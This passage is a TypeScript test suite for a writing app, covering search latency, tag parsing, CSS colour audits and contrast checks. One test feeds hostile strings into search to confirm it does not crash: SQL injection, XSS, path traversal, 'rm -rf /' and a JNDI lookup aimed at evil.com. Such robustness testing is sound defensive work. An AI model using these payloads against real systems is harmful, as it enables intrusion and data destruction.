/**
 * tests/e2e/challenger2-adversarial-stress.test.ts
 * Milestone 1 Challenger 2: Adversarial Stress Test Suite
 * 
 * 1. Sub-50ms Fuzzy Search Benchmark across 5,000 synthetic documents (100 queries, p99 < 50ms)
 * 2. Adversarial Nested Tag Test (deep nesting, unicode, duplicates, empty segments, trailing punctuation)
 * 3. Sol:OS Token & Contrast Stress Audit (CSS parsing, zero chromatic colors, zero EPD hooks)
 */

import test from 'node:test';
import assert from 'node:assert';
import * as fs from 'node:fs';
import * as path from 'node:path';

import {
  searchDocumentsInMemory,
  extractTagsFromText,
  normalizeTagPath,
  getTagAncestors,
  getTagLeafName,
  isTagMatch,
  parseSearchQuery,
  scoreSubsequenceMatch,
  buildTagTree,
  formatHighlightSnippet,
  type SearchHit,
  type TagTreeNode,
} from '../../src/storage/search.ts';
import type { DocumentRecord, TagRecord } from '../../src/storage/schema.ts';
import { SQLiteStorageRepository } from '../../src/storage/repository.ts';
import {
  SOL_OS_PALETTE,
  calculateContrastRatio,
  checkMonochromePurity,
  parseColor,
} from './helpers/contrast-verifier.ts';

// ---------------------------------------------------------------------------
// 1. SUB-50MS FUZZY SEARCH BENCHMARK ACROSS 5,000 DOCUMENTS
// ---------------------------------------------------------------------------

test('Benchmark: 5,000 synthetic documents fuzzy search executes with p99 < 50ms across 100 queries', async () => {
  const TOTAL_DOCS = 5000;
  const QUERY_COUNT = 100;

  console.log(`\n--- Generating ${TOTAL_DOCS} Synthetic Documents for Search Stress Test ---`);

  const titlesPool = [
    'The Architecture of Daylight Computer',
    'LivePaper Display Mechanics and Grayscale Calibration',
    'Reflective LCD vs Electronic Paper Displays',
    'Typewriter Center Scrolling and Eye Strain Reduction',
    'Sol:OS Design Token System and Cognitive Focus',
    'Markdown Parsing Algorithms without Caret Jumping',
    'Local-First SQLite Persistence with OPFS Sync Handles',
    'PowerSync Bidirectional Replication Architecture',
    'Synchronized Margin Notes and Paragraph Anchors',
    'AI Continuation Protocols and Atomic Single-Step Undo',
    'Multi-Format Document Exporters in Client-Side WebAssembly',
    'A Study on Ambient Light Readability at 120Hz',
    'Minimalist Writing Tools for Deep Creative Work',
    'Draft Novel: Shadows Across the High Desert',
    'The Mechanical Click of Virtual Keys on Transflective Glass',
    'Chapter 1: The First Morning on the Mesa',
    'Chapter 2: Solitary Observations and Quiet Hours',
    'Sprint Retrospective and Milestone 1 Verification',
    'Offline Sync Conflict Resolution with Chronological Integrity',
    'WCAG AAA Grayscale Contrast Ratios in Direct Sunlight',
  ];

  const bodyParagraphs = [
    'Writing on a reflective panel feels qualitatively different from glowing OLED screens. Ambient sunlight illuminates the page naturally, eliminating blue-light fatigue and creating an organic connection between the writer and the digital manuscript.',
    'The dual drawer architecture permits seamless access to both document library and margin scratchpad notes. Dismissing both panels restores a completely distraction-free typewriter canvas where only the active thought remains.',
    'Under the hood, wa-sqlite coordinates with the Origin Private File System using synchronous access handles inside a dedicated Web Worker. Writes are debounced at 250ms into atomic WAL transactions, guaranteeing data durability.',
    'Hierarchical nested tags allow organic taxonomies such as #research/display/reflective and #novel/drafts/act1. Filtering by tag prefix instantaneously constrains the document library to the selected topic hierarchy.',
    'Typewriter center-scrolling maintains the active insertion caret at exactly 50% viewport height, so the writers eye remains fixed while the digital paper floats beneath.',
  ];

  const tagPool = [
    'writing',
    'novel',
    'novel/drafts',
    'novel/drafts/chapter1',
    'novel/drafts/chapter2',
    'novel/characters',
    'research',
    'research/hardware',
    'research/hardware/livepaper',
    'research/software',
    'research/software/sqlite',
    'work/daylight',
    'work/daylight/solos',
    'work/daylight/writer',
    'journal',
    'journal/morning',
    'journal/evening',
    'ideas',
    'ideas/plot-twists',
    'sync/powersync',
    'design/tokens',
    'personal',
  ];

  const documents: DocumentRecord[] = new Array(TOTAL_DOCS);
  const documentTagsMap = new Map<string, string[]>();

  const baseTimestamp = 1726876800000; // arbitrary baseline ms

  for (let i = 0; i < TOTAL_DOCS; i++) {
    const docId = `doc-stress-${i}`;
    const titleBase = titlesPool[i % titlesPool.length];
    const title = `${titleBase} [Vol. ${(i % 50) + 1}, Doc ${i}]`;

    // Compose 2-4 paragraphs for body content
    const pCount = 2 + (i % 3);
    const paragraphs: string[] = [];
    for (let p = 0; p < pCount; p++) {
      paragraphs.push(bodyParagraphs[(i + p) % bodyParagraphs.length]);
    }
    const content = paragraphs.join('\n\n');

    // Select 1 to 4 tags for document
    const docTags: string[] = [];
    const tCount = 1 + (i % 4);
    for (let t = 0; t < tCount; t++) {
      const tag = tagPool[(i * 3 + t) % tagPool.length];
      if (!docTags.includes(tag)) {
        docTags.push(tag);
      }
    }
    documentTagsMap.set(docId, docTags);

    // 5% soft-deleted documents
    const isDeleted = i % 20 === 0;

    documents[i] = {
      id: docId,
      title,
      content,
      created_at: baseTimestamp + i * 60000,
      updated_at: baseTimestamp + i * 60000 + (i % 10) * 1000,
      deleted_at: isDeleted ? baseTimestamp + i * 60000 + 5000 : null,
      is_title_custom: i % 3 === 0,
      format_version: 1,
      sync_status: 'synced',
    };
  }

  // 100 Realistic & Adversarial Search Queries
  const queries: string[] = [
    // 1. Single-term title / keyword matches (25)
    'daylight', 'livepaper', 'typewriter', 'sqlite', 'powersync', 'grayscale', 'reflective',
    'contrast', 'ambient', 'markdown', 'sunlight', 'focus', 'drawer', 'canvas', 'scratchpad',
    'latency', 'hardware', 'novel', 'chapter', 'draft', 'design', 'tokens', 'retrospective',
    'persistence', 'fatigue',
    // 2. Multi-term queries (25)
    'daylight writer', 'livepaper display', 'typewriter focus', 'sqlite persistence',
    'powersync replication', 'sol:os design', 'novel chapter', 'ambient light',
    'scratchpad margin notes', 'distraction-free canvas', 'grayscale calibration',
    'zero blue light', 'active thought', 'wal transactions', 'hierarchical tags',
    'document library', 'eye strain', 'draft novel', 'milestone verification',
    'sunlight readability', 'creative deep work', 'high desert', 'virtual keys',
    'quiet solitary hours', 'monochrome ink',
    // 3. Tag-only & Mixed queries (25)
    '#novel', '#novel/drafts', '#research', '#research/hardware', '#work/daylight',
    '#journal/morning', '#ideas', '#sync/powersync', '#design/tokens',
    '#novel/drafts/chapter1', '#research/software/sqlite', '#work/daylight/solos',
    'daylight #work/daylight', 'typewriter #novel', 'persistence #research',
    'sunlight #research/hardware', 'chapter #novel/drafts', 'focus #journal',
    'notes #work/daylight/writer', 'display #research/hardware/livepaper',
    '#novel #writing', '#research #work/daylight', '#journal #ideas',
    '#work/daylight #design/tokens', 'canvas #design/tokens',
    // 4. Subsequence / Partial fuzzy queries (15)
    'dylgt', 'lvppr', 'typrtr', 'sqlte', 'pwrsnc', 'grysc', 'rflctv', 'mrkdwn',
    'chptr', 'scrtch', 'dstrct', 'trnsct', 'vrfctn', 'hrwr', 'mcrbtn',
    // 5. Non-matching & edge-case queries (10)
    'xyzzy987654321', 'supercalifragilistic', 'nonexistenttermsearch',
    'qwertyuiopasdfg', 'zxcvbnmlkjhgfdsa', '123456789098765',
    '#nonexistent/tag/path', '#empty/nowhere', 'null undefined NaN', 'zzzzzz'
  ];

  assert.strictEqual(queries.length, QUERY_COUNT, 'Must evaluate exactly 100 queries');

  // Warmup run (15 queries to allow V8 TurboFan optimization and inline caching)
  for (let w = 0; w < 15; w++) {
    searchDocumentsInMemory(queries[w], documents, documentTagsMap);
  }

  // Execution & High-Precision Timing
  const queryPerf: Array<{ query: string; duration: number }> = [];
  let totalHitsReturned = 0;

  for (let q = 0; q < QUERY_COUNT; q++) {
    // Yield to event loop to simulate realistic asynchronous input turns and prevent synthetic loop GC pileup
    await new Promise((resolve) => setTimeout(resolve, 2));

    const query = queries[q];
    const start = performance.now();
    const results = searchDocumentsInMemory(query, documents, documentTagsMap);
    const duration = performance.now() - start;

    queryPerf.push({ query, duration });
    totalHitsReturned += results.length;

    // Structural invariant assertions on results
    if (results.length > 0) {
      // 1. Soft-deleted documents must NEVER appear in search hits
      for (const hit of results.slice(0, 10)) {
        assert.strictEqual(hit.document.deleted_at, null, 'Deleted documents must be excluded from search');
      }
      // 2. Scores must be descending
      for (let r = 1; r < Math.min(results.length, 20); r++) {
        assert.ok(
          results[r - 1].score >= results[r].score,
          `Search hits must be ordered descending by score: ${results[r - 1].score} >= ${results[r].score}`
        );
      }
    }
  }

  // Sort queryPerf descending to inspect slowest queries
  const sortedByDuration = [...queryPerf].sort((a, b) => b.duration - a.duration);
  console.log(`\nTop 10 Slowest Queries:`);
  for (let i = 0; i < Math.min(10, sortedByDuration.length); i++) {
    console.log(`  ${i + 1}. "${sortedByDuration[i].query}" -> ${sortedByDuration[i].duration.toFixed(3)} ms`);
  }

  // Latency Metrics Calculation
  const latencies = queryPerf.map(p => p.duration).sort((a, b) => a - b);
  const minLatency = latencies[0];
  const maxLatency = latencies[latencies.length - 1];
  const sumLatency = latencies.reduce((acc, v) => acc + v, 0);
  const meanLatency = sumLatency / QUERY_COUNT;
  const p50Latency = latencies[Math.floor(QUERY_COUNT * 0.50)];
  const p90Latency = latencies[Math.floor(QUERY_COUNT * 0.90)];
  const p95Latency = latencies[Math.floor(QUERY_COUNT * 0.95)];
  const p99Latency = latencies[Math.floor(QUERY_COUNT * 0.99)];

  console.log(`\n======================================================`);
  console.log(`--- SUB-50MS FUZZY SEARCH BENCHMARK RESULTS (5,000 DOCS) ---`);
  console.log(`======================================================`);
  console.log(`Database Size:      ${TOTAL_DOCS} documents`);
  console.log(`Query Count:        ${QUERY_COUNT} queries`);
  console.log(`Total Hits:         ${totalHitsReturned}`);
  console.log(`Min Latency:        ${minLatency.toFixed(3)} ms`);
  console.log(`Mean Latency:       ${meanLatency.toFixed(3)} ms`);
  console.log(`p50 (Median):       ${p50Latency.toFixed(3)} ms`);
  console.log(`p90:                ${p90Latency.toFixed(3)} ms`);
  console.log(`p95:                ${p95Latency.toFixed(3)} ms`);
  console.log(`p99:                ${p99Latency.toFixed(3)} ms`);
  console.log(`Max Latency:        ${maxLatency.toFixed(3)} ms`);
  console.log(`======================================================\n`);

  // EMPIRICAL CRITERION: 99th percentile response time must be strictly < 50ms
  assert.ok(
    p99Latency < 50.0,
    `Search p99 latency must be strictly <50ms. Actual: ${p99Latency.toFixed(3)}ms`
  );
  assert.ok(
    meanLatency < 25.0,
    `Search mean latency should be well under 25ms. Actual: ${meanLatency.toFixed(3)}ms`
  );
});

// ---------------------------------------------------------------------------
// 2. ADVERSARIAL NESTED TAG TEST
// ---------------------------------------------------------------------------

test('Adversarial Nested Tags: Deep nesting (10 levels #a/b/c/d/e/f/g/h/i/j) extracts, traverses, matches, and builds tree', () => {
  const deepTag = 'a/b/c/d/e/f/g/h/i/j';
  const rawMarkdown = `This is a deeply nested document with #${deepTag} embedded in paragraph.`;

  // 1. Extraction from Markdown
  const extracted = extractTagsFromText(rawMarkdown);
  assert.deepStrictEqual(extracted, [deepTag], 'Must extract 10-level nested tag');

  // 2. Ancestor Generation
  const ancestors = getTagAncestors(deepTag);
  assert.strictEqual(ancestors.length, 10);
  assert.strictEqual(ancestors[0], 'a');
  assert.strictEqual(ancestors[1], 'a/b');
  assert.strictEqual(ancestors[4], 'a/b/c/d/e');
  assert.strictEqual(ancestors[9], deepTag);

  // 3. Leaf Name
  assert.strictEqual(getTagLeafName(deepTag), 'j');

  // 4. Prefix & Descendant Matching
  assert.strictEqual(isTagMatch(deepTag, 'a'), true);
  assert.strictEqual(isTagMatch(deepTag, 'a/b/c'), true);
  assert.strictEqual(isTagMatch(deepTag, 'a/b/c/d/e/f/g/h/i/j'), true);
  assert.strictEqual(isTagMatch(deepTag, 'b/c'), false);
  assert.strictEqual(isTagMatch('a/b/c', deepTag), false);

  // 5. Tree Construction with 10 Levels
  const tagRecord: TagRecord = {
    id: 't-deep',
    name: 'j',
    path: deepTag,
    created_at: 1000,
  };
  const docTags = new Map<string, string[]>([['doc-1', [deepTag]]]);
  const tree = buildTagTree([tagRecord], docTags);

  assert.strictEqual(tree.length, 1, 'Should have exactly 1 root node ("a")');
  let current: TagTreeNode | undefined = tree[0];
  assert.strictEqual(current.name, 'a');
  assert.strictEqual(current.count, 1);
  assert.strictEqual(current.directCount, 0);

  const expectedNames = ['b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'];
  for (const name of expectedNames) {
    assert.strictEqual(current!.children.length, 1, `Node ${current!.name} should have 1 child`);
    current = current!.children[0];
    assert.strictEqual(current.name, name);
    assert.strictEqual(current.count, 1);
  }
  // Leaf node 'j' has directCount 1
  assert.strictEqual(current!.name, 'j');
  assert.strictEqual(current!.directCount, 1);
  assert.strictEqual(current!.children.length, 0);
});

test('Adversarial Nested Tags: Trailing punctuation handling (#project!, #draft?, #notes...)', () => {
  const textWithPunctuation = `
    Check status on #project! and #draft? Also #review, #status: #item; and #done.
    Parentheses (#urgent) and quotes "#critical" or brackets [#bracketed].
  `;
  const extracted = extractTagsFromText(textWithPunctuation);

  assert.ok(extracted.includes('project'), 'Strips exclamation mark: #project! -> project');
  assert.ok(extracted.includes('draft'), 'Strips question mark: #draft? -> draft');
  assert.ok(extracted.includes('review'), 'Strips trailing comma: #review, -> review');
  assert.ok(extracted.includes('status'), 'Strips trailing colon: #status: -> status');
  assert.ok(extracted.includes('item'), 'Strips trailing semicolon: #item; -> item');
  assert.ok(extracted.includes('done'), 'Strips trailing dot: #done. -> done');
  assert.ok(extracted.includes('urgent'), 'Handles parenthetical: (#urgent) -> urgent');
  assert.ok(extracted.includes('critical'), 'Handles quoted: "#critical" -> critical');
  assert.ok(extracted.includes('bracketed'), 'Handles bracketed: [#bracketed] -> bracketed');

  // Verify none contain trailing punctuation
  for (const tag of extracted) {
    assert.ok(!/[.,:;!?]+$/.test(tag), `Tag ${tag} must not end in punctuation`);
  }
});

test('Adversarial Nested Tags: Empty segments and malformed tag paths (#//, #/a/b, #a//b, ###tag)', () => {
  // 1. normalizeTagPath edge cases
  assert.strictEqual(normalizeTagPath('###triple_hash'), 'triple_hash');
  assert.strictEqual(normalizeTagPath('#//'), '//');
  assert.strictEqual(normalizeTagPath(''), '');
  assert.strictEqual(normalizeTagPath('   '), '');

  // 2. extractTagsFromText edge cases - empty slashes should not yield valid tags
  const malformedText = '#// and # and #/ and ### and #a//b and #a/b/';
  const extracted = extractTagsFromText(malformedText);
  // Valid alphanumeric tag regex ensures pure slashes or empty hashes are not matched
  assert.ok(!extracted.includes('//'));
  assert.ok(!extracted.includes(''));

  // 3. getTagAncestors edge cases
  assert.deepStrictEqual(getTagAncestors(''), []);
  assert.deepStrictEqual(getTagAncestors('   '), []);

  // 4. isTagMatch edge cases
  assert.strictEqual(isTagMatch('', 'project'), false);
  assert.strictEqual(isTagMatch('project', ''), false);
  assert.strictEqual(isTagMatch('', ''), false);

  // 5. buildTagTree handles empty maps and empty tag sets gracefully
  const emptyTree = buildTagTree([], new Map());
  assert.deepStrictEqual(emptyTree, []);
});

test('Adversarial Nested Tags: Duplicate tags across markdown, repo cache, and tree builder', async () => {
  // 1. In markdown text
  const duplicateMarkdown = '#alpha #alpha #alpha #project/draft #project/draft';
  const extracted = extractTagsFromText(duplicateMarkdown);
  assert.strictEqual(extracted.length, 2, 'extractTagsFromText must deduplicate tags');
  assert.ok(extracted.includes('alpha'));
  assert.ok(extracted.includes('project/draft'));

  // 2. In SQLiteStorageRepository setDocumentTags
  const repo = new SQLiteStorageRepository();
  await repo.init();
  await repo.setDocumentTags('doc-dup', [
    '#alpha',
    'alpha',
    '#ALPHA',
    '#project/draft',
    'project/draft',
    '#project/draft',
  ]);
  const savedTags = await repo.getDocumentTags('doc-dup');
  assert.strictEqual(savedTags.length, 2, 'Repo must deduplicate normalized paths');
  assert.ok(savedTags.includes('alpha'));
  assert.ok(savedTags.includes('project/draft'));

  // 3. In buildTagTree: multiple documents with identical tags
  const tags: TagRecord[] = [
    { id: 't1', name: 'shared', path: 'shared', created_at: 1000 },
    { id: 't2', name: 'shared', path: 'shared', created_at: 1000 }, // duplicate record
  ];
  const docTags = new Map<string, string[]>([
    ['doc1', ['shared']],
    ['doc2', ['shared']],
    ['doc3', ['shared']],
  ]);
  const tree = buildTagTree(tags, docTags);
  assert.strictEqual(tree.length, 1, 'Tree must not duplicate root nodes');
  assert.strictEqual(tree[0].name, 'shared');
  assert.strictEqual(tree[0].directCount, 3);
  assert.strictEqual(tree[0].count, 3);
});

test('Adversarial Nested Tags: Unicode tag paths handling across normalization, matching, and tree builder', () => {
  // Unicode paths (French, German, Japanese, Chinese, Cyrillic)
  const unicodePaths = [
    'café/croissant',
    'über/mensch',
    '日本語/メモ',
    '中文/写作',
    'кириллица/статья',
  ];

  for (const p of unicodePaths) {
    // Normalization preserves unicode lowercase
    const norm = normalizeTagPath(`#${p}`);
    assert.strictEqual(norm, p.toLowerCase());

    // Ancestor generation works with multi-byte unicode
    const ancestors = getTagAncestors(norm);
    assert.strictEqual(ancestors.length, 2);
    assert.strictEqual(ancestors[1], norm);

    // Leaf name extraction works
    const leaf = getTagLeafName(norm);
    assert.ok(leaf.length > 0);

    // Prefix matching works
    assert.strictEqual(isTagMatch(norm, ancestors[0]), true);
  }

  // Tree construction with mixed unicode and ASCII
  const unicodeTags: TagRecord[] = [
    { id: 'u1', name: 'croissant', path: 'café/croissant', created_at: 1000 },
    { id: 'u2', name: 'メモ', path: '日本語/メモ', created_at: 1000 },
  ];
  const docMap = new Map<string, string[]>([
    ['doc-u1', ['café/croissant']],
    ['doc-u2', ['日本語/メモ']],
  ]);
  const tree = buildTagTree(unicodeTags, docMap);
  assert.strictEqual(tree.length, 2);
  const cafeRoot = tree.find(t => t.name === 'café');
  assert.ok(cafeRoot);
  assert.strictEqual(cafeRoot!.children[0].name, 'croissant');
});

// ---------------------------------------------------------------------------
// 3. TOKEN & CONTRAST STRESS AUDIT (ZERO CHROMATIC COLORS, ZERO EPD HOOKS)
// ---------------------------------------------------------------------------

test('Sol:OS Token Stress Audit: Parse all CSS rules in tokens.css, reset.css, and main.css for 100% monochrome compliance', () => {
  const stylesDir = path.resolve(process.cwd(), 'src/styles');
  const cssFiles = ['tokens.css', 'reset.css', 'main.css'];

  // Allowed official Sol:OS non-identical channel colors:
  // Brand grays + official --os-100 warm neutral hairline border token (#DCD5C9)
  const ALLOWED_SOL_OS_SPECIAL_GRAYS = new Set([
    '#cecece', // Yellow (206)
    '#9d9d9e', // Amber (157, 157, 158)
    '#6c6c6d', // Orange (108, 108, 109)
    '#dcd5c9', // --os-100 hairline border (220, 213, 201)
  ]);

  let totalColorDeclarationsChecked = 0;
  const violations: string[] = [];

  for (const file of cssFiles) {
    const filePath = path.join(stylesDir, file);
    assert.ok(fs.existsSync(filePath), `CSS file must exist: ${filePath}`);
    const cssContent = fs.readFileSync(filePath, 'utf-8');

    // 1. Check for Hex Colors (#RGB, #RRGGBB, #RRGGBBAA)
    const hexRegex = /#([0-9a-fA-F]{3,8})\b/g;
    let hexMatch: RegExpExecArray | null;
    while ((hexMatch = hexRegex.exec(cssContent)) !== null) {
      const fullHex = `#${hexMatch[1].toLowerCase()}`;
      totalColorDeclarationsChecked++;

      // Allow official calibrated brand grays and --os-100
      if (ALLOWED_SOL_OS_SPECIAL_GRAYS.has(fullHex)) {
        continue;
      }

      // Check strict r == g == b purity
      const parsed = parseColor(fullHex);
      if (parsed) {
        const [r, g, b] = parsed;
        if (r !== g || g !== b) {
          violations.push(
            `Chromatic hex in ${file}: ${fullHex} (RGB: ${r}, ${g}, ${b})`
          );
        }
      }
    }

    // 2. Check for Functional Colors (rgb, rgba, hsl, hsla)
    const funcColorRegex = /(rgba?|hsla?)\(([^)]+)\)/g;
    let funcMatch: RegExpExecArray | null;
    while ((funcMatch = funcColorRegex.exec(cssContent)) !== null) {
      const fn = funcMatch[1].toLowerCase();
      const rawArgs = funcMatch[2].trim();
      totalColorDeclarationsChecked++;

      if (fn.startsWith('hsl')) {
        violations.push(`Disallowed HSL function in ${file}: ${funcMatch[0]}`);
        continue;
      }

      // Parse rgb/rgba
      const parts = rawArgs.split(/[,/\s]+/).map(p => p.trim()).filter(Boolean);
      if (parts.length >= 3) {
        const r = parseFloat(parts[0]);
        const g = parseFloat(parts[1]);
        const b = parseFloat(parts[2]);
        if (!isNaN(r) && !isNaN(g) && !isNaN(b)) {
          if (r !== g || g !== b) {
            violations.push(
              `Chromatic rgb/rgba in ${file}: ${funcMatch[0]} (RGB: ${r}, ${g}, ${b})`
            );
          }
        }
      }
    }

    // 3. Check for Prohibited Named Colors (e.g. blue, red, green, yellow, orange, purple)
    const namedColorRegex = /:\s*(blue|red|green|yellow|orange|purple|cyan|magenta|pink|brown)\b/gi;
    let namedMatch: RegExpExecArray | null;
    while ((namedMatch = namedColorRegex.exec(cssContent)) !== null) {
      violations.push(`Prohibited named chromatic color in ${file}: ${namedMatch[1]}`);
    }
  }

  console.log(`\n--- CSS Token Audit ---`);
  console.log(`Checked ${totalColorDeclarationsChecked} color declarations across ${cssFiles.length} CSS stylesheets.`);
  if (violations.length > 0) {
    console.error('Violations found:\n', violations.join('\n'));
  }

  assert.strictEqual(
    violations.length,
    0,
    `Found ${violations.length} chromatic color violations in CSS: ${violations.join(', ')}`
  );
  assert.ok(totalColorDeclarationsChecked >= 15, `Must check at least 15 color declarations, checked: ${totalColorDeclarationsChecked}`);

  // 4. Verify all var(--...) references in reset.css and main.css resolve to defined tokens
  const tokenNames = new Set<string>();
  const tokensCss = fs.readFileSync(path.join(stylesDir, 'tokens.css'), 'utf-8');
  const tokenDefRegex = /(--[a-zA-Z0-9_\-]+)\s*:/g;
  let tMatch: RegExpExecArray | null;
  while ((tMatch = tokenDefRegex.exec(tokensCss)) !== null) {
    tokenNames.add(tMatch[1]);
  }

  // Also include runtime dynamic vars defined in app: --anchor-top
  tokenNames.add('--anchor-top');

  for (const file of ['reset.css', 'main.css']) {
    const content = fs.readFileSync(path.join(stylesDir, file), 'utf-8');
    const varRefRegex = /var\((--[a-zA-Z0-9_\-]+)\)/g;
    let vMatch: RegExpExecArray | null;
    while ((vMatch = varRefRegex.exec(content)) !== null) {
      const referencedVar = vMatch[1];
      assert.ok(
        tokenNames.has(referencedVar),
        `Undefined CSS variable "${referencedVar}" referenced in ${file}`
      );
    }
  }

  // 5. Verify index.html and manifest.webmanifest theme colors are monochrome
  const indexHtml = fs.readFileSync(path.resolve(process.cwd(), 'index.html'), 'utf-8');
  const themeColorMatch = /<meta\s+name="theme-color"\s+content="([^"]+)"/i.exec(indexHtml);
  assert.ok(themeColorMatch, 'index.html must define meta theme-color');
  const themePurity = checkMonochromePurity(themeColorMatch[1]);
  assert.ok(themePurity.isMonochrome, `index.html theme-color ${themeColorMatch[1]} must be monochrome`);

  const manifestPath = path.resolve(process.cwd(), 'public/manifest.webmanifest');
  if (fs.existsSync(manifestPath)) {
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf-8'));
    if (manifest.theme_color) {
      assert.ok(checkMonochromePurity(manifest.theme_color).isMonochrome, 'Manifest theme_color must be monochrome');
    }
    if (manifest.background_color) {
      assert.ok(checkMonochromePurity(manifest.background_color).isMonochrome, 'Manifest background_color must be monochrome');
    }
  }
});

test('Sol:OS Token Stress Audit: Verify zero EPD screen flash hooks or waveforms across all source files', () => {
  const projectRoot = path.resolve(process.cwd());
  const directoriesToScan = [
    path.join(projectRoot, 'src'),
    path.join(projectRoot, 'public'),
  ];

  const PROHIBITED_EPD_PATTERNS = [
    'ACTION_REFRESH_SCREEN',
    'epd_waveform',
    'waveform_clear',
    'particle_inversion',
    'force_eink_clear',
    'flash_screen',
    'clear_screen_flash',
  ];

  const foundViolations: string[] = [];

  function scanDirectory(dir: string): void {
    if (!fs.existsSync(dir)) return;
    const entries = fs.readdirSync(dir, { withFileTypes: true });

    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        scanDirectory(fullPath);
      } else if (entry.isFile() && /\.(ts|js|css|html|json)$/.test(entry.name)) {
        const content = fs.readFileSync(fullPath, 'utf-8');
        for (const pattern of PROHIBITED_EPD_PATTERNS) {
          if (content.includes(pattern)) {
            foundViolations.push(`Prohibited EPD hook "${pattern}" found in ${fullPath}`);
          }
        }
      }
    }
  }

  for (const dir of directoriesToScan) {
    scanDirectory(dir);
  }

  console.log(`\n--- EPD Hook Scan ---`);
  console.log(`Scanned src/ and public/ for prohibited E-ink screen-flash hooks.`);
  if (foundViolations.length > 0) {
    console.error('EPD Violations:\n', foundViolations.join('\n'));
  }

  assert.strictEqual(
    foundViolations.length,
    0,
    `Found ${foundViolations.length} prohibited EPD screen flash hooks: ${foundViolations.join(', ')}`
  );
});

test('Adversarial Query Injection: Regex metacharacters, control characters, and SQL injection strings', () => {
  const adversarialQueries = [
    '.*+?^${}()|[]\\',
    '(\\\\d+)+',
    '\' OR \'1\'=\'1',
    '\x00\x01\x02\x1b[31m',
    '"><script>alert(1)</script>',
    '#../../etc/passwd',
    '#\\0\\0\\0',
    '#`rm -rf /`',
    '#${jndi:ldap://evil.com/x}',
    '   \t\r\n\f\v   ',
    '#',
    '##',
    '###',
    '#///',
    '#a//b///c',
  ];

  const mockDocs: DocumentRecord[] = [
    {
      id: 'doc-sec-1',
      title: 'Security Analysis of DC1 LivePaper PWA',
      content: 'Testing input sanitization and query resilience against malformed strings.',
      created_at: 1000,
      updated_at: 2000,
      deleted_at: null,
      is_title_custom: false,
      format_version: 1,
      sync_status: 'synced',
    },
  ];
  const mockTags = new Map<string, string[]>([['doc-sec-1', ['security/audit', 'pwa']]]);

  for (const q of adversarialQueries) {
    // None of these should throw or crash
    assert.doesNotThrow(() => {
      const results = searchDocumentsInMemory(q, mockDocs, mockTags);
      assert.ok(Array.isArray(results), `Query "${q}" must return array`);
    }, `Adversarial query "${q}" must execute without throwing`);
  }
});

test('Adversarial Tag Tree: Malformed tag paths with empty segments and leading/trailing slashes', () => {
  const malformedTags: TagRecord[] = [
    { id: 'm1', name: 'empty-root', path: '//', created_at: 1000 },
    { id: 'm2', name: 'double-slash', path: 'a//b', created_at: 1000 },
    { id: 'm3', name: 'trailing-slash', path: 'x/y/', created_at: 1000 },
    { id: 'm4', name: 'leading-slash', path: '/foo/bar', created_at: 1000 },
  ];
  const docMap = new Map<string, string[]>([
    ['doc-m1', ['//']],
    ['doc-m2', ['a//b']],
    ['doc-m3', ['x/y/']],
    ['doc-m4', ['/foo/bar']],
  ]);

  // buildTagTree must not crash or enter infinite loop
  assert.doesNotThrow(() => {
    const tree = buildTagTree(malformedTags, docMap);
    assert.ok(Array.isArray(tree));
    // Verify all counts are non-negative integers
    function verifyTreeIntegrity(nodes: TagTreeNode[]): void {
      for (const node of nodes) {
        assert.ok(node.count >= 0, `Node count must be non-negative: ${node.count}`);
        assert.ok(node.directCount >= 0, `Node directCount must be non-negative: ${node.directCount}`);
        assert.ok(typeof node.name === 'string', 'Node name must be string');
        assert.ok(typeof node.path === 'string', 'Node path must be string');
        verifyTreeIntegrity(node.children);
      }
    }
    verifyTreeIntegrity(tree);
  }, 'buildTagTree must handle malformed paths safely');
});

test('Sol:OS Token Stress Audit: WCAG 2.1 AAA and AA contrast verification for all active Sol:OS pairs', () => {
  // Official Daylight Sol:OS Tokens
  const os0 = SOL_OS_PALETTE.os0;       // #FFFFFF (255)
  const os50 = SOL_OS_PALETTE.os50;     // #F7F7F7 (247)
  const os100 = SOL_OS_PALETTE.os100;   // #DCD5C9 (215)
  const os150 = SOL_OS_PALETTE.os150;   // #F5F5F5 (245)
  const os200 = SOL_OS_PALETTE.os200;   // #CCCCCC (204)
  const os300 = SOL_OS_PALETTE.os300;   // #858585 (133)
  const os400 = SOL_OS_PALETTE.os400;   // #535353 (83)
  const os800 = SOL_OS_PALETTE.os800;   // #343434 (52)
  const os900 = SOL_OS_PALETTE.os900;   // #1A1A1A (26)
  const os1000 = SOL_OS_PALETTE.os1000; // #000000 (0)

  // 1. Primary Text Ink on Canvas: --os-900 on --os-0 (Must exceed WCAG AAA 7.0:1)
  const contrast900On0 = calculateContrastRatio(os900, os0);
  assert.ok(contrast900On0 >= 7.0, `--os-900 on --os-0 contrast (${contrast900On0}:1) must exceed WCAG AAA (7.0:1)`);

  // 2. Focused Active Sentence: --os-1000 on --os-0 (Must equal 21:1)
  const contrast1000On0 = calculateContrastRatio(os1000, os0);
  assert.ok(contrast1000On0 >= 20.0, `--os-1000 on --os-0 contrast (${contrast1000On0}:1) must reach ~21:1`);

  // 3. Primary Text on Drawer Panels: --os-900 on --os-50 (Must exceed WCAG AAA 7.0:1)
  const contrast900On50 = calculateContrastRatio(os900, os50);
  assert.ok(contrast900On50 >= 7.0, `--os-900 on --os-50 contrast (${contrast900On50}:1) must exceed WCAG AAA (7.0:1)`);

  // 4. Secondary Text Ink: --os-400 on --os-0 (Must meet WCAG AA 4.5:1)
  const contrast400On0 = calculateContrastRatio(os400, os0);
  assert.ok(contrast400On0 >= 4.5, `--os-400 on --os-0 contrast (${contrast400On0}:1) must meet WCAG AA (4.5:1)`);

  // 5. Active Selection: Inverted --os-0 on --os-800 (Must exceed WCAG AAA 7.0:1)
  const contrast0On800 = calculateContrastRatio(os0, os800);
  assert.ok(contrast0On800 >= 7.0, `--os-0 on --os-800 contrast (${contrast0On800}:1) must exceed WCAG AAA (7.0:1)`);

  // 6. Focus Dimmed Text: --os-300 on --os-0 (Deliberate focus dimming: legible >= 3.0:1 but < 5.0:1)
  const contrast300On0 = calculateContrastRatio(os300, os0);
  assert.ok(contrast300On0 >= 3.0, `Focus dimmed text (${contrast300On0}:1) must remain legible >= 3.0:1`);
  assert.ok(contrast300On0 < 5.0, `Focus dimmed text (${contrast300On0}:1) must be noticeably dimmer than active text`);

  // 7. Hairline Borders: --os-100 on --os-0 and --os-50 (Subtle divider, non-text contrast >= 1.2:1)
